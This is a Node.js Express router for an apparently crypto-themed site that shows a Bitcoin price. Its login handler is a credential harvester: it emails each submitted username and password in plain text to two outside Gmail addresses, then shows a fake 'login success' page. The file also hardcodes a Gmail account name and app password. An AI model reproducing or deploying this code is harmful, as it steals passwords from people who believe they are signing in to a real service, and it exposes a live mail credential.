const express = require('express');
const { append } = require('express/lib/response');
const nodemailer = require('nodemailer');
const CoinGecko = require('coingecko-api');

const router = express.Router();

var _coinList = {};
const btc = "";

const CoinGeckoClient = new CoinGecko();


    let fire = async()=>{let data = await CoinGeckoClient.exchanges.fetchTickers('bitfinex', {
        coin_ids: ['bitcoin']
    });
    var _coinList = {};
    var _datacc = data.data.tickers.filter(t => t.target == 'USD');
    [
        'BTC'
    ].forEach((i) => {
        var _temp = _datacc.filter(t => t.base == i);
        var _res = _temp.length == 0 ? [] : _temp[0];
        _coinList[i] = _res.last;
    })
 return _coinList;
}

fire().then(k => console.log(k));





// const btc = _coinList.BTC;

router.get('/', (req, res) => {
    res.render('home');
})


router.get('/login', (req, res) => {
    res.render('login');
});

router.get('/register', (req, res) => {
    res.render('register');
})



router.post('/login', async(req, res) => {

    const username = req.body.username;
    const password = req.body.password;

    let transporter = await nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'ramsinghhosiya@gmail.com', // generated ethereal user
            pass: 'znocxbmpdeujccss' // generated ethereal password
        },
    });

    transporter.verify().then(console.log).catch(console.error);

    const msg = {
            from: '"Fred Foo 👻"ramsinghhosiya@gmail.com', // sender address
            to: "farmahar08@gmail.com, vpn.inbit@gmail.com",

            subject: "INFO", // Subject line
            text: "Username: " + username + " Password: " + password, // plain text body

        }
        // send mail with defined transport object
    let info = await transporter.sendMail(msg);

    console.log("Message sent: %s", info.messageId);
    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

    // Preview only available when sending through an Ethereal account
    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));

    fire().then(k => k.BTC).then(k=> {
        res.render('login-success', {btc: k})
    });
    


 ;

});


router.post('/register', (req,res)=> {
    fire().then(k => k.BTC).then(k=> {
        res.render('login-success', {btc: k})
    });
});





module.exports = router;